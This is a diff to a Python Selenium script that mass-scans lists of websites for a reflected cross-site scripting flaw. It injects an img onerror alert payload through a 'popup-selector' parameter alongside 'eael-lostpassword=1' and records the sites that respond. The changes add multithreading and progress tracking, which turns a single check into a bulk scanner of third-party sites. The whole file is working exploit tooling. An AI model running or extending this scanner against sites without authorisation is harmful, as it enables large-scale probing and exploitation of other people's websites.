@@ -1,5 +1,10 @@
 import sys
 import time
+import threading
+import queue
+import re
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
@@ -8,8 +13,42 @@ from selenium.webdriver.common.alert import Alert
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException, WebDriverException
-#By Chirag Artani
+# By Chirag Artani
+# Lock for thread-safe file writing
+file_lock = threading.Lock()
+# Counter for statistics
+stats = {
+    'vulnerable': 0,
+    'errors': 0,
+    'processed': 0
+}
+stats_lock = threading.Lock()
+
+def is_valid_url(url):
+    """Check if the URL is valid and has a scheme"""
+    if not url or url.isspace():
+        return False
+    
+    # Remove any BOM characters that might be at the start
+    url = url.lstrip('\ufeff')
+    
+    # Check if the URL starts with http:// or https://
+    if not url.startswith(('http://', 'https://')):
+        return False
+    
+    try:
+        result = urlparse(url)
+        return all([result.scheme, result.netloc])
+    except:
+        return False
+
 def check_xss(url):
+    """Test a URL for XSS vulnerability"""
+    # Skip invalid URLs
+    if not is_valid_url(url):
+        print(f"[INVALID URL] Skipping: {url}")
+        return False
+    
     # Configure Chrome options
     chrome_options = Options()
     chrome_options.add_argument("--headless")
@@ -20,7 +59,7 @@ def check_xss(url):
     chrome_options.add_argument("--ignore-ssl-errors")
     
     # Create payload URL
-    payload_url = f"{url}?popup-selector=%3Cimg_src=x_onerror=alert(%22chirgart%22)%3E&eael-lostpassword=1"
+    payload_url = f"{url}/?popup-selector=%3Cimg_src=x_onerror=alert(%22chirgart%22)%3E&eael-lostpassword=1"
     
     # Initialize the WebDriver with webdriver-manager
     try:
@@ -52,16 +91,18 @@ def check_xss(url):
             
             if "chirgart" in alert_text:
                 print(f"[VULNERABLE] XSS confirmed on {url}")
-                with open("vulnerable.txt", "a") as f:
-                    f.write(f"{url}\n")
+                with file_lock:
+                    with open("found-vuln-fully.txt", "a") as f:
+                        f.write(f"{url}\n")
                 return True
         except (TimeoutException, NoAlertPresentException):
             print(f"[NOT VULNERABLE] No XSS alert detected on {url}")
             return False
         except UnexpectedAlertPresentException:
             print(f"[VULNERABLE] XSS confirmed on {url} (unexpected alert)")
-            with open("vulnerable.txt", "a") as f:
-                f.write(f"{url}\n")
+            with file_lock:
+                with open("found-vuln-fully.txt", "a") as f:
+                    f.write(f"{url}\n")
             return True
             
     except WebDriverException as e:
@@ -79,48 +120,131 @@ def check_xss(url):
     
     return False
 
+def worker(url_queue, total_urls):
+    """Worker function for threads"""
+    while not url_queue.empty():
+        try:
+            url = url_queue.get_nowait()
+            
+            # Skip empty URLs
+            if not url or not url.strip():
+                url_queue.task_done()
+                continue
+                
+            # Sanitize URL
+            url = url.strip()
+            
+            # Remove BOM character if present
+            if url.startswith('\ufeff'):
+                url = url[1:]
+                
+            # Remove trailing slash if present
+            if url.endswith("/"):
+                url = url[:-1]
+            
+            with stats_lock:
+                stats['processed'] += 1
+                current = stats['processed']
+            
+            print(f"[{current}/{total_urls}] Testing: {url}")
+            
+            try:
+                is_vulnerable = check_xss(url)
+                
+                if is_vulnerable:
+                    with stats_lock:
+                        stats['vulnerable'] += 1
+            except Exception as e:
+                print(f"[ERROR] Failed to test {url}: {e}")
+                with stats_lock:
+                    stats['errors'] += 1
+        except queue.Empty:
+            break
+        except Exception as e:
+            print(f"Worker error: {e}")
+        finally:
+            url_queue.task_done()
+
 if __name__ == "__main__":
     # Check if file with URLs is provided as argument
     if len(sys.argv) < 2:
-        print("Usage: python check.py <url_or_file>")
+        print("Usage: python check.py <url_or_file> [threads]")
         sys.exit(1)
     
     input_arg = sys.argv[1]
+    
+    # Get number of threads (default: 5)
+    num_threads = 5
+    if len(sys.argv) > 2:
+        try:
+            num_threads = int(sys.argv[2])
+        except ValueError:
+            print(f"Invalid thread count, using default: {num_threads}")
     
     # Check if the argument is a file
     if input_arg.endswith('.txt'):
         # Process URLs from file
         try:
-            with open(input_arg, "r") as f:
+            with open(input_arg, "r", encoding="utf-8") as f:
                 urls = [line.strip() for line in f.readlines() if line.strip()]
             
-            print(f"Loaded {len(urls)} URLs to test")
+            # Filter out invalid URLs
+            valid_urls = [url for url in urls if is_valid_url(url)]
+            invalid_count = len(urls) - len(valid_urls)
+            if invalid_count > 0:
+                print(f"Found {invalid_count} invalid URLs that will be skipped")
             
-            vulnerable_count = 0
-            error_count = 0
+            total_urls = len(valid_urls)
+            print(f"Loaded {total_urls} valid URLs to test using {num_threads} threads")
             
-            for i, url in enumerate(urls):
-                # Remove trailing slash if present
-                if url.endswith("/"):
-                    url = url[:-1]
-                
-                print(f"[{i+1}/{len(urls)}] Testing: {url}")
-                
-                try:
-                    is_vulnerable = check_xss(url)
+            # Create work queue
+            url_queue = queue.Queue()
+            for url in valid_urls:
+                url_queue.put(url)
+            
+            # Create and start worker threads
+            threads = []
+            for _ in range(min(num_threads, total_urls)):
+                t = threading.Thread(target=worker, args=(url_queue, total_urls))
+                t.daemon = True
+                t.start()
+                threads.append(t)
+            
+            # Monitor progress
+            start_time = time.time()
+            try:
+                while not url_queue.empty():
+                    completed = stats['processed']
+                    elapsed = time.time() - start_time
                     
-                    if is_vulnerable:
-                        vulnerable_count += 1
-                except Exception as e:
-                    print(f"[ERROR] Failed to test {url}: {e}")
-                    error_count += 1
+                    if elapsed > 0 and completed > 0:
+                        urls_per_second = completed / elapsed
+                        remaining = total_urls - completed
+                        eta_seconds = remaining / urls_per_second if urls_per_second > 0 else 0
+                        
+                        eta_str = ""
+                        if eta_seconds > 0:
+                            eta_min = int(eta_seconds / 60)
+                            eta_sec = int(eta_seconds % 60)
+                            eta_str = f" - ETA: {eta_min}m {eta_sec}s"
+                        
+                        print(f"Progress: {completed}/{total_urls} ({(completed/total_urls*100):.1f}%) - Vulnerable: {stats['vulnerable']} - Errors: {stats['errors']}{eta_str}")
+                    
+                    time.sleep(5)  # Update every 5 seconds
                 
-                # Add a small delay between requests
-                time.sleep(0.5)
+                # Wait for all threads to complete
+                url_queue.join()
+                
+            except KeyboardInterrupt:
+                print("\nScan interrupted by user. Saving results...")
             
-            print(f"\nCompleted testing {len(urls)} URLs")
-            print(f"Found {vulnerable_count} vulnerable sites (saved to vulnerable.txt)")
-            print(f"Encountered errors on {error_count} sites")
+            elapsed_time = time.time() - start_time
+            minutes = int(elapsed_time // 60)
+            seconds = int(elapsed_time % 60)
+            
+            print(f"\nCompleted testing {stats['processed']}/{total_urls} URLs in {minutes}m {seconds}s")
+            print(f"Found {stats['vulnerable']} vulnerable sites (saved to found-vuln-fully.txt)")
+            print(f"Encountered errors on {stats['errors']} sites")
             
         except Exception as e:
             print(f"Error processing file: {e}")
